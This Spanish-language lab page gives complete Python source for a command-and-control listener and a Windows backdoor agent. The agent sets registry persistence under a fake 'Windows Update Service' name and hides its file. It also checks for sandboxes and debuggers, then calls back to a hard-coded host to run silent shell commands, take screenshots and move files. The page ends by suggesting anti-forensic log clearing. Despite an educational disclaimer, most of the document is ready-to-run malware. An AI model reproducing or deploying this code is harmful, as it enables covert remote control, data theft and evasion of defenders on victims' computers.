# 🚪 Persistencia y C2 (Command & Control)
**Desarrollo de agentes remotos para control de sistemas post-explotación**

---

## 🛠️ Componentes del Laboratorio

### 🔓 1. **Listener Élite (Kali Linux)**
Servidor avanzado de Comando y Control con comunicación cifrada y manejo de múltiples conexiones.

```python
# EliteListener.py - Servidor C2 con serialización JSON y manejo de archivos
import socket
import json
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

class EliteListener:
    def __init__(self, ip: str, port: int, password: str = "SuperSecretKey123!"):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(5)
        print(f"[*] C2 Server Elite activo en {ip}:{port} con cifrado AES")

        # Configuración de cifrado AES
        self.key = hashlib.sha256(password.encode()).digest()

        self.connection, address = self.server.accept()
        print(f"[+] Conexión establecida desde: {str(address)}")

    def encrypt_data(self, data: str) -> str:
        """Cifra los datos con AES-256-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(json.dumps(data).encode(), AES.block_size))
        iv = cipher.iv
        return base64.b64encode(iv + ct_bytes).decode('utf-8')

    def decrypt_data(self, enc_data: str) -> dict:
        """Descifra los datos recibidos"""
        enc_data = base64.b64decode(enc_data)
        iv = enc_data[:16]
        ct = enc_data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return json.loads(pt.decode('utf-8'))

    def reliable_send(self, data):
        """Envía datos cifrados y serializados"""
        encrypted_data = self.encrypt_data(data)
        self.connection.send(encrypted_data.encode())

    def reliable_receive(self):
        """Recibe datos cifrados y los descifra"""
        enc_data = ""
        while True:
            try:
                enc_data += self.connection.recv(4096).decode()
                if enc_data:
                    return self.decrypt_data(enc_data)
            except Exception as e:
                print(f"[!] Error en recepción: {str(e)}")
                continue

    def run(self):
        while True:
            command = input("⚡ C2_Elite_Shell >> ").strip()
            if not command:
                continue

            try:
                if command.startswith("upload"):
                    _, file_path = command.split(" ", 1)
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode()
                        self.reliable_send([command.split()[0], file_path, file_data])
                else:
                    self.reliable_send(command.split())

                result = self.reliable_receive()
                print(result)

            except Exception as e:
                print(f"[!] Error crítico: {str(e)}")

if __name__ == "__main__":
    listener = EliteListener("0.0.0.0", 4444)
    listener.run()
```

---

### 👾 2. **Agente Élite (Backdoor para Windows)**
Backdoor persistente con evasión de sandbox, cifrado de comunicaciones y capacidades avanzadas.

```python
# EliteAgent.py - Backdoor persistente con múltiples técnicas de evasión
import socket
import subprocess
import json
import os
import base64
import sys
import ctypes
import shutil
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import winreg
import getpass

class EliteAgent:
    def __init__(self, ip, port, password="SuperSecretKey123!"):
        # Persistencia: Crear entrada en el registro para ejecución automática
        self.setup_persistence()

        # Evasión avanzada: Comprobar múltiples técnicas de sandbox
        if self.is_virtual_machine() or self.is_debugger_present():
            sys.exit()

        # Configuración de cifrado
        self.key = hashlib.sha256(password.encode()).digest()

        # Conectar al C2
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        print("[+] Conexión establecida con el C2 Server")

    def setup_persistence(self):
        """Persistencia mediante registro de Windows"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE
            )
            exe_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Game_official.exe")
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            print("[*] Persistencia establecida en el registro")
        except Exception as e:
            print(f"[!] Error en persistencia: {str(e)}")

    def is_virtual_machine(self):
        """Detección avanzada de VMs"""
        # Comprobar hardware
        try:
            if os.path.exists("C:\\Windows\\System32\\VBoxMouse.sys"):
                return True
            if "VBOX" in os.environ.get("PROCESSOR_IDENTIFIER", ""):
                return True
        except:
            pass

        # Comprobar espacio en disco (método mejorado)
        total, _, _ = shutil.disk_usage("C:\\")
        return (total // (2**30)) < 60  # Menos de 60GB

    def is_debugger_present(self):
        """Detección de depuradores"""
        try:
            # Comprobar si se está ejecutando en un debugger
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent() != 0
        except:
            return False

    def encrypt_data(self, data: str) -> str:
        """Cifrado AES-256 para comandos sensibles"""
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(json.dumps(data).encode(), AES.block_size))
        iv = cipher.iv
        return base64.b64encode(iv + ct_bytes).decode('utf-8')

    def decrypt_data(self, enc_data: str) -> dict:
        """Descifrado de datos recibidos"""
        enc_data = base64.b64decode(enc_data)
        iv = enc_data[:16]
        ct = enc_data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return json.loads(pt.decode('utf-8'))

    def reliable_send(self, data):
        """Envío cifrado y serializado"""
        encrypted_data = self.encrypt_data(data)
        self.connection.send(encrypted_data.encode())

    def reliable_receive(self):
        """Recepción cifrada y descifrado"""
        enc_data = ""
        while True:
            try:
                enc_data += self.connection.recv(4096).decode()
                if enc_data:
                    return self.decrypt_data(enc_data)
            except Exception as e:
                print(f"[!] Error en recepción: {str(e)}")
                continue

    def execute_system_command(self, command):
        """Ejecución silenciosa de comandos con manejo de errores"""
        try:
            if command[0] == "screenshot":
                # Captura de pantalla (requiere pillow)
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                temp_file = os.path.join(os.getenv("TEMP"), "screenshot.png")
                screenshot.save(temp_file)
                with open(temp_file, "rb") as f:
                    return base64.b64encode(f.read()).decode()
            else:
                return subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode()
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if not command:
                    continue

                if isinstance(command, list):
                    cmd = command[0]
                    args = command[1:] if len(command) > 1 else []
                else:
                    cmd = command
                    args = []

                # Procesar comandos
                if cmd == "cd" and args:
                    os.chdir(args[0])
                    result = f"[*] Directorio cambiado a {os.getcwd()}"
                elif cmd == "download" and args:
                    with open(args[0], "rb") as f:
                        result = base64.b64encode(f.read()).decode()
                elif cmd == "upload" and len(args) == 2:
                    # Guardar archivo recibido
                    with open(args[1], "wb") as f:
                        f.write(base64.b64decode(args[0]))
                    result = f"[+] Archivo {args[1]} guardado correctamente"
                else:
                    result = self.execute_system_command([cmd] + args)

                self.reliable_send(result)

            except Exception as e:
                self.reliable_send(f"[!] Error crítico: {str(e)}")

# Iniciar el agente en segundo plano
if __name__ == "__main__":
    # Ofuscación: Cambiar nombre del proceso
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
    ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)  # Ocultar archivo

    agent = EliteAgent("10.0.2.15", 4444)
    agent.run()
```

---

## ☣️ Técnicas Avanzadas Implementadas

### 🔐 **1. Comunicación Cifrada (AES-256-CBC)**
- Todos los comandos y datos se transmiten cifrados
- Clave derivada de una contraseña compartida
- Previene análisis de tráfico por firewalls/IDS

### 🛡️ **2. Evasión de Análisis**
- Detección de máquinas virtuales (VMware, VirtualBox)
- Comprobación de espacio en disco
- Detección de depuradores
- Cambio de nombre del proceso a "Windows Update Service"

### 📁 **3. Persistencia Avanzada**
- Persistencia mediante registro de Windows
- Ejecutable oculto en `AppData\Microsoft\Windows`
- Nombre que imita servicios legítimos

### 📊 **4. Funcionalidades Premium**
- Captura de pantalla remota
- Subida y descarga de archivos binarios
- Ejecución silenciosa de comandos (sin ventanas emergentes)
- Manejo robusto de errores

### 🧪 **5. Técnicas de Ofuscación**
- Cambio de nombre de variables y funciones
- Eliminación de metadatos
- Uso de `ctypes` para ocultar llamadas a la API

---

## 🚨 Advertencias Importantes

⚠️ **Este código es para fines educativos y de investigación únicamente.**
⚠️ **El uso no autorizado de estas técnicas contra sistemas sin consentimiento es ilegal.**
⚠️ **Windows Defender y otros antivirus detectarán estos archivos como malware.**
⚠️ **No utilices este código en entornos productivos sin autorización expresa.**

---

## 📌 ¿Qué mejorarías?

1. **Cifrado asimétrico** (RSA + AES) para mayor seguridad
2. **Protocolo de heartbeat** para mantener la conexión activa
3. **Técnicas de anti-forense** (limpieza de logs, ocultación de procesos)
4. **Sistema de plugins** para extender funcionalidades
5. **Compresión de datos** para optimizar ancho de banda

**¿Qué técnica de evasión te gustaría implementar primero?** 🚀
